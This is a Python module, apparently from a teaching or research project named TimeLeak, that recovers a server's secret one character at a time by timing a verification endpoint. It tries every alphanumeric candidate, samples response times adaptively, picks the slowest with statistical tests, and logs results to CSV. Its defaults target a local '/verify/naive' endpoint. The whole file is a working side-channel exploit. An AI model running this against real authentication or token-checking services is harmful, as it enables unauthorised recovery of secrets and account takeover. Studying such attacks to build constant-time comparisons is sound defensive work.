"""
Byte-by-byte secret recovery via timing side-channel analysis.
"""

import csv
import os
import random
import string
from datetime import datetime, timezone
from typing import Optional

import numpy as np

from measure import measure_timing
from stats_engine import (
    compare_top_two,
    confidence_interval,
    rank_candidates,
    std_dev,
    trimmed_mean,
)

# Candidate alphabet for secret bytes
ALPHABET = string.ascii_letters + string.digits


def build_guess(prefix: str, candidate: str, total_length: int) -> str:
    """
    Build a guess string: known prefix + candidate at current position + random padding.
    Padding uses random chars so length is always total_length (matches server secret length).
    """
    if len(prefix) + 1 > total_length:
        return prefix[:total_length]
    remaining = total_length - len(prefix) - 1
    padding = ''.join(random.choices(ALPHABET, k=remaining)) if remaining > 0 else ''
    return prefix + candidate + padding


def attack_position(
    base_url: str,
    endpoint: str,
    position: int,
    prefix: str,
    secret_length: int,
    samples: int = 300,
    max_samples: int = 2000,
    warmup: int = 10,
    p_threshold: float = 0.05,
    verbose: bool = True,
) -> dict:
    """
    Recover one byte at `position` by trying all alphabet candidates.
    Returns dict with winner, p_value, conclusive, all candidate stats, samples.
    """
    candidate_samples = {}

    for candidate in ALPHABET:
        guess = build_guess(prefix, candidate, secret_length)
        if verbose:
            print(f"  Position {position}: measuring '{candidate}' (guess={guess[:position+1]}...)")

        timings = measure_timing(
            base_url, endpoint, guess, samples=samples, warmup=warmup
        )
        candidate_samples[candidate] = timings

    ranked = rank_candidates(candidate_samples)
    winner, p_value, conclusive = compare_top_two(ranked, candidate_samples, p_threshold)

    # Adaptive sampling if top two are too close
    if not conclusive and len(ranked) >= 2:
        top_char = ranked[0][0]
        second_char = ranked[1][0]
        if verbose:
            print(f"  Inconclusive (p={p_value:.4f}), collecting more samples...")

        while not conclusive:
            total_top = len(candidate_samples[top_char])
            total_second = len(candidate_samples[second_char])
            if total_top >= max_samples and total_second >= max_samples:
                break

            batch = min(100, max_samples - total_top)
            if batch <= 0:
                break

            for char in [top_char, second_char]:
                guess = build_guess(prefix, char, secret_length)
                extra = measure_timing(
                    base_url, endpoint, guess, samples=batch, warmup=2
                )
                candidate_samples[char] = np.concatenate(
                    [candidate_samples[char], extra]
                )

            ranked = rank_candidates(candidate_samples)
            winner, p_value, conclusive = compare_top_two(
                ranked, candidate_samples, p_threshold
            )
            if verbose:
                print(f"    samples={len(candidate_samples[top_char])}, p={p_value:.4f}")

    top_mean = trimmed_mean(candidate_samples[winner]) if winner else 0.0
    top_std = std_dev(candidate_samples[winner]) if winner else 0.0
    _, ci_low, ci_high = (
        confidence_interval(candidate_samples[winner])
        if winner
        else (0.0, 0.0, 0.0)
    )

    result = {
        'position': position,
        'winner': winner,
        'p_value': p_value,
        'conclusive': conclusive,
        'mean_ms': top_mean,
        'stdev_ms': top_std,
        'ci_low': ci_low,
        'ci_high': ci_high,
        'ranked': ranked,
        'candidate_samples': candidate_samples,
    }
    return result


def run_attack(
    base_url: str = 'http://localhost:3000',
    endpoint: str = '/verify/naive',
    secret_length: int = 16,
    samples: int = 300,
    max_samples: int = 2000,
    warmup: int = 10,
    p_threshold: float = 0.05,
    results_dir: str = 'results',
    verbose: bool = True,
) -> tuple[str, str]:
    """
    Full byte-by-byte secret recovery. Logs all measurements to CSV.
    Returns (recovered_secret, csv_path).
    """
    os.makedirs(results_dir, exist_ok=True)
    timestamp = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
    endpoint_slug = endpoint.strip('/').replace('/', '_')
    csv_path = os.path.join(results_dir, f'attack_{endpoint_slug}_{timestamp}.csv')

    prefix = ''
    rows = []

    if verbose:
        print(f"TimeLeak attack → {base_url}{endpoint}")
        print(f"Secret length: {secret_length}, samples/candidate: {samples}")
        print('-' * 50)

    for pos in range(secret_length):
        result = attack_position(
            base_url=base_url,
            endpoint=endpoint,
            position=pos,
            prefix=prefix,
            secret_length=secret_length,
            samples=samples,
            max_samples=max_samples,
            warmup=warmup,
            p_threshold=p_threshold,
            verbose=verbose,
        )

        winner = result['winner'] or '?'
        prefix += winner

        if verbose:
            status = 'OK' if result['conclusive'] else 'INCONCLUSIVE'
            print(
                f"Position {pos}: '{winner}' "
                f"(mean={result['mean_ms']:.3f}ms, p={result['p_value']:.4f}) [{status}]"
            )

        for candidate, samples_arr in result['candidate_samples'].items():
            rows.append({
                'timestamp': datetime.now(timezone.utc).isoformat(),
                'endpoint': endpoint,
                'position': pos,
                'candidate': candidate,
                'prefix': prefix[:-1] if winner != '?' else prefix,
                'mean_ms': trimmed_mean(samples_arr),
                'median_ms': float(np.median(samples_arr)),
                'stdev_ms': std_dev(samples_arr),
                'n_samples': len(samples_arr),
                'p_value': result['p_value'] if candidate == winner else '',
                'winner': candidate == winner,
                'conclusive': result['conclusive'],
                'recovered_so_far': prefix,
            })

        # Write CSV incrementally
        _write_csv(csv_path, rows)

    if verbose:
        print('-' * 50)
        print(f"Recovered secret: {prefix}")
        print(f"Results saved to: {csv_path}")

    return prefix, csv_path


def _write_csv(path: str, rows: list) -> None:
    if not rows:
        return
    fieldnames = list(rows[0].keys())
    with open(path, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)
